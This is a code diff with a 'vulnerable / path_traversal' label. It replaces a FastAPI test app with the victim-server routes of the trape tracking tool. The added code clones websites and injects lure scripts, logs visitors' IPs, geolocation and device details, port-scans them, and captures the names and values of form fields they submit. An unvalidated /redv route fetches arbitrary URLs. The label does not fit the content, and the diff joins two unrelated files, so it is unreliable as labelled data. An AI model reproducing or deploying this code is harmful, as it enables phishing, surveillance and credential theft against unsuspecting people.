@@ -2,160 +2,204 @@
 # Safety: vulnerable
 # Category: path_traversal
 
-""" A FastAPI app used to create an OpenAPI document for end-to-end testing """
+#!/usr/bin/env python
 
-import json
+# -*- coding: utf-8 -*-
 
-from datetime import date, datetime
+#**
 
-from enum import Enum
+#
 
-from pathlib import Path
+#########
 
-from typing import Any, Dict, List, Union
+# trape #
 
+#########
 
+#
 
-from fastapi import APIRouter, FastAPI, File, Header, Query, UploadFile
+# trape depends of this file
 
-from pydantic import BaseModel
+# For full copyright information this visit: https://github.com/boxug/trape
 
+#
 
+# Copyright 2017 by boxug / <hey@boxug.com>
 
-app = FastAPI(title="My Test API", description="An API for testing openapi-python-client",)
+#**
 
+import time
 
+import urllib2
 
+from flask import Flask, render_template, session, request, json
 
+from core.victim_objects import *
 
-@app.get("/ping", response_model=bool)
+import core.stats
 
-async def ping():
+from core.utils import utils
 
-    """ A quick check to see if the system is running """
+from core.db import Database
 
-    return True
 
 
 
 
+# Main parts, to generate relationships among others
 
-test_router = APIRouter()
+trape = core.stats.trape
 
+app = core.stats.app
 
 
 
+# call database
 
-class AnEnum(Enum):
+db = Database()
 
-    """ For testing Enums in all the ways they can be used """
 
 
+class victim_server(object):
 
-    FIRST_VALUE = "FIRST_VALUE"
+    @app.route("/" + trape.victim_path)
 
-    SECOND_VALUE = "SECOND_VALUE"
+    def homeVictim():
 
+        opener = urllib2.build_opener()
 
+        headers = victim_headers()
 
+        opener.addheaders = headers
 
+        html = victim_inject_code(opener.open(trape.url_to_clone).read(), 'lure')
 
-class DifferentEnum(Enum):
+        return html
 
-    FIRST_VALUE = "DIFFERENT"
 
-    SECOND_VALUE = "OTHER"
 
+    @app.route("/register", methods=["POST"])
 
+    def register():
 
+        vId = request.form['vId']
 
+        if vId == '':
 
-class OtherModel(BaseModel):
+          vId = utils.generateToken(5)
 
-    """ A different model for calling from TestModel """
 
 
+        victimConnect = victim(vId, request.environ['REMOTE_ADDR'], request.user_agent.platform, request.user_agent.browser, request.user_agent.version,  utils.portScanner(request.environ['REMOTE_ADDR']), request.form['cpu'], time.strftime("%Y-%m-%d - %H:%M:%S"))
 
-    a_value: str
+        victimGeo = victim_geo(vId, 'city', request.form['countryCode'], request.form['country'], request.form['query'], request.form['lat'], request.form['lon'], request.form['org'], request.form['region'], request.form['regionName'], request.form['timezone'], request.form['zip'], request.form['isp'], str(request.user_agent))
 
 
 
+        utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " A victim has been connected from " + utils.Color['blue'] + victimGeo.ip + utils.Color['white'] + ' with the following identifier: ' + utils.Color['green'] + vId + utils.Color['white'])
 
+        cant = int(db.sentences_victim('count_times', vId, 3, 0))
 
-class AModel(BaseModel):
 
-    """ A Model for testing all the ways custom objects can be used """
 
+        db.sentences_victim('insert_click', [vId, trape.url_to_clone, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
 
+        db.sentences_victim('delete_networks', [vId], 2)
 
-    an_enum_value: AnEnum
 
-    nested_list_of_enums: List[List[DifferentEnum]] = []
 
-    some_dict: Dict[str, str] = {}
+        if cant > 0:
 
-    aCamelDateTime: Union[datetime, date]
+            utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " " + "It\'s his " + str(cant + 1) + " time")
 
-    a_date: date
+            db.sentences_victim('update_victim', [victimConnect, vId, time.time()], 2)
 
+            db.sentences_victim('update_victim_geo', [victimGeo, vId], 2)
 
+        else:
 
+            utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " " + "It\'s his first time")
 
+            db.sentences_victim('insert_victim', [victimConnect, vId, time.time()], 2)
 
-@test_router.get("/", response_model=List[AModel], operation_id="getUserList")
+            db.sentences_victim('insert_victim_geo', [victimGeo, vId], 2)
 
-def get_list(an_enum_value: List[AnEnum] = Query(...), some_date: Union[date, datetime] = Query(...)):
+        return json.dumps({'status' : 'OK', 'vId' : vId});
 
-    """ Get a list of things """
 
-    return
 
+    @app.route("/nr", methods=["POST"])
 
+    def networkRegister():
 
+        vId = request.form['vId']
 
+        vIp = request.form['ip']
 
-@test_router.post("/upload")
+        vnetwork = request.form['red']
 
-async def upload_file(some_file: UploadFile = File(...), keep_alive: bool = Header(None)):
+        if vId == '':
 
-    """ Upload a file """
+          vId = utils.generateToken(5)
 
-    data = await some_file.read()
+        utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "+" + utils.Color['white'] + "]" + utils.Color['whiteBold'] + " " + vnetwork + utils.Color['white'] + " session detected from " + utils.Color['blue'] + vIp + utils.Color['white'] + ' ' + "with ID: " + utils.Color['green'] + vId + utils.Color['white'])
 
-    return (some_file.filename, some_file.content_type, data)
 
 
+        cant = int(db.sentences_victim('count_victim_network', [vId, vnetwork], 3, 0))
 
 
 
-@test_router.post("/json_body")
+        if cant > 0:
 
-def json_body(body: AModel):
+            db.sentences_victim('update_network', [vId, vnetwork, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
 
-    """ Try sending a JSON body """
+        else:
 
-    return
+            db.sentences_victim('insert_networks', [vId, vIp, request.environ['REMOTE_ADDR'], vnetwork, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
 
+        return json.dumps({'status' : 'OK', 'vId' : vId});
 
 
 
+    @app.route("/redv")
 
-app.include_router(test_router, prefix="/tests", tags=["tests"])
+    def redirectVictim():
 
+        url = request.args.get('url')
 
+        opener = urllib2.build_opener()
 
+        headers = victim_headers()
 
+        opener.addheaders = headers
 
-def generate_openapi_json():
+        html = victim_inject_code(opener.open(url).read(), 'vscript')
 
-    path = Path(__file__).parent / "openapi.json"
+        return html
 
-    path.write_text(json.dumps(app.openapi(), indent=4))
 
 
+    @app.route("/regv", methods=["POST"])
 
+    def registerRequest():
 
+        vrequest = victim_request(request.form['vId'], request.form['site'], request.form['fid'], request.form['name'], request.form['value'], request.form['sId'])
 
-if __name__ == "__main__":
+        db.sentences_victim('insert_requests', [vrequest, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
 
-    generate_openapi_json()
+        utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "=" + utils.Color['white'] + "]" + " " + 'Receiving data from: ' + utils.Color['green'] + vrequest.id + utils.Color['white']  + ' ' + 'on' + ' ' + utils.Color['blue'] + vrequest.site + utils.Color['white'] + '\t\n' + vrequest.fid + '\t' + vrequest.name + ':\t' + vrequest.value)
+
+        return json.dumps({'status' : 'OK', 'vId' : vrequest.id});
+
+
+
+    @app.route("/tping", methods=["POST"])
+
+    def receivePing():
+
+        vrequest = request.form['id']
+
+        db.sentences_victim('report_online', [vrequest])
+
+        return json.dumps({'status' : 'OK', 'vId' : vrequest});
